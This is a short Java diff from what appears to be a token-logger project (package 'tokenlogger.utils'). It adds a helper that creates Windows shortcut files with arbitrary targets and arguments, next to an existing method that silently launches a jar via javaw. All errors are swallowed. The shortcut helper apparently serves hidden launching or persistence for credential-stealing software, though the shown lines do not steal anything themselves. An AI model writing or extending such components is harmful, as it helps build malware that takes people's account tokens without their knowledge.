@@ -2,6 +2,8 @@ package tokenlogger.utils;
 
 import java.io.File;
 
+import mslinks.ShellLink;
+
 public class FileHelper {
     public static void delete(String filePath) {
         File file = new File(filePath);
@@ -12,6 +14,19 @@ public class FileHelper {
         try {
             ProcessBuilder processBuilder = new ProcessBuilder("javaw", "-jar", appPath);
             processBuilder.start();
+        } catch (Exception ignored) {}
+    }
+
+    public static void createShortcut(String targetPath, String savePath, String... args) {
+        try {
+            ShellLink sl = new ShellLink();
+            sl.setTarget(targetPath);
+            StringBuilder argsList = new StringBuilder();
+            for (String arg : args) {
+                argsList.append(arg).append(" ");
+            }
+            sl.setCMDArgs(argsList.toString());
+            sl.saveTo(savePath);
         } catch (Exception ignored) {}
     }
 }
